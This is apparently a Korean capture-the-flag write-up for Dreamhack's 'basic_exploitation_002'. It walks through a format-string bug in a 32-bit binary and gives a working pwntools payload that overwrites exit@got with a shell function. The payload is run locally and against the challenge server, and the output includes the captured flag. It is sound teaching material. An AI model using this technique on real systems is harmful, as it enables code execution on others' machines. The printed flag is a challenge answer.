# Stage10_basic_exploitation_002[문제]

## 1 파일 확인

- unzip 명령어로 파일 압축 해제

```bash
$ unzip 73fd9a8e-66ed-4c7d-8d62-57b98fe85979.zip 
Archive:  73fd9a8e-66ed-4c7d-8d62-57b98fe85979.zip
  inflating: basic_exploitation_002.c  
  inflating: basic_exploitation_002
```

- ls -al 명령어로 파일 목록 확인

```bash
$ ls -al
total 24
drwxrwxr-x  2 magan20 magan20 4096 11월 26 03:44 .
drwxrwxr-x 19 magan20 magan20 4096 11월 26 03:42 ..
-rw-rw-r--  1 magan20 magan20 3462 11월 26 03:41 73fd9a8e-66ed-4c7d-8d62-57b98fe85979.zip
-rwxr-xr-x  1 magan20 magan20 7776  4월  2  2020 basic_exploitation_002
-rw-r--r--  1 magan20 magan20  472  4월  2  2020 basic_exploitation_002.c
```

- file 명령어로 basic_exploitation_002 파일 확인

```bash
$ file basic_exploitation_002
basic_exploitation_002: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4edc3b7b1d4cc47397011a77cabb0b8f7025b52b, not stripped
```

basic_exploitation_002 파일은 32bit ELF 파일이다.

- cat 명령어로 basic_exploitation_002.c 파일 확인

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);  // 포멧 스트링 버그 발생

    exit(0);
}
```

- checksec 으로 보호기법 확인

```c
$ checksec ./basic_exploitation_002 
[*] '/home/magan20/dreamhack/system/basic_exploitation_002/basic_exploitation_002'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

PIE 가 걸려있지 않으므로 code 영역의 주소는 변하지 않는다.

## 2. 시나리오 작성

- 포멧스트링 버그를 사용해 exit@got 의 값을 get_shell() 함수의 주소로 변경한다.

1. exit@got를 get_shell() 함수의 주소를 덮어씌운다.

## 3. 필요 정보 수집

```bash
$ gdb-gef basic_exploitation_002 -q
Reading symbols from basic_exploitation_002...
(No debugging symbols found in basic_exploitation_002)
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 9.2 in 0.00ms using Python engine 3.8
gef➤  disas main
Dump of assembler code for function main:
   0x0804861c <+0>:	push   ebp
   0x0804861d <+1>:	mov    ebp,esp
   0x0804861f <+3>:	add    esp,0xffffff80
   0x08048622 <+6>:	call   0x80485c2 <initialize>
   0x08048627 <+11>:	push   0x80
   0x0804862c <+16>:	lea    eax,[ebp-0x80]
   0x0804862f <+19>:	push   eax
   0x08048630 <+20>:	push   0x0
   0x08048632 <+22>:	call   0x8048410 <read@plt>
   0x08048637 <+27>:	add    esp,0xc
   0x0804863a <+30>:	lea    eax,[ebp-0x80]
   0x0804863d <+33>:	push   eax
   0x0804863e <+34>:	call   0x8048420 <printf@plt>
   0x08048643 <+39>:	add    esp,0x4
   0x08048646 <+42>:	push   0x0
   0x08048648 <+44>:	call   0x8048470 <exit@plt>
End of assembler dump.
```

1. get_shell() 함수 주소 확인

```c
gef➤  p get_shell
$1 = {<text variable, no debug info>} 0x8048609 <get_shell>
gef➤
```

- get_shell() 주소 : 0x8048609

## 4. 페이로드 작성

1. 페이로드 작성

```python
from pwn import *

p = process("./basic_exploitation_002")
e = ELF("./basic_exploitation_002")

exit_got = e.got["exit"]
get_shell_2 = 0x804
get_shell_1 = 0x8609

payload = b""
payload += p32(exit_got+2)
payload += p32(exit_got)
payload += b"%2044c"
payload += b"%1$hn"
payload += b"%32261c"
payload += b"%2$hn"

p.sendline(payload)
p.interactive()
```

1. 로컬 공격

```bash
$ python3 payload.py 
[+] Starting local process './basic_exploitation_002': pid 19619
[*] '/home/magan20/dreamhack/system/basic_exploitation_002/basic_exploitation_002'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
&\xa0\x04$\xa0\x04
$ id
uid=1000(magan20) gid=1000(magan20) groups=1000(magan20),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
```

## 5. 공격

1. 접속 정보 확인

```bash
Host: host3.dreamhack.games
Port: 21007/tcp
```

1. 페이로드 수정

```python
from pwn import *

#p = process("./basic_exploitation_002")
p = remote("host3.dreamhack.games", 21007)
e = ELF("./basic_exploitation_002")

exit_got = e.got["exit"]
get_shell_2 = 0x804
get_shell_1 = 0x8609

payload = b""
payload += p32(exit_got+2)
payload += p32(exit_got)
payload += b"%2044c"
payload += b"%1$hn"
payload += b"%32261c"
payload += b"%2$hn"

p.sendline(payload)
p.interactive()
```

1. 공격
```bash
$ python3 payload.py
[+] Opening connection to host3.dreamhack.games on port 21007: Done
[*] '/home/magan20/dreamhack/system/basic_exploitation_002/basic_exploitation_002'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
&\xa0\x04$\xa0\x04
$ id
uid=1000(basic_exploitation_002) gid=1000(basic_exploitation_002) groups=1000(basic_exploitation_002)
$ cat flag
DH{59c4a03eff1e4c10c87ff123fb93d56c}
$
```
